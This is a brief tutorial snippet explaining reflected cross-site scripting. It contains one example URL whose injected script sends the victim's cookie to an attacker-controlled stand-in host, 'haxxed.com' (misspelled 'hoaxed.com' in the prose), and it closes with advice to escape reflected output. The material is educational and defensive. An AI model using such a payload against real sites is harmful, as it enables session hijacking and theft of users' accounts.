# XSS Reflected
If a site is vulnerable to reflected XSS, an attacker could craft the following URL to get its cookie from another user:
```
www.welp.com?search=<script>window.location="http://haxxed.com?cookie="+document.cookie</script>
```

The above link which is apparently from welp.com would redirect the victim who clicked it to hoaxed.com and would send his/her welp.com cookie as a query parameter. Since the attacker controls haxxed.com, he/she could check server logs and retrieve the victim’s cookie for welp.com

## Important:
Always make sure results that are reflected to the user in any way, search results, error pages and form submissions are properly escaped.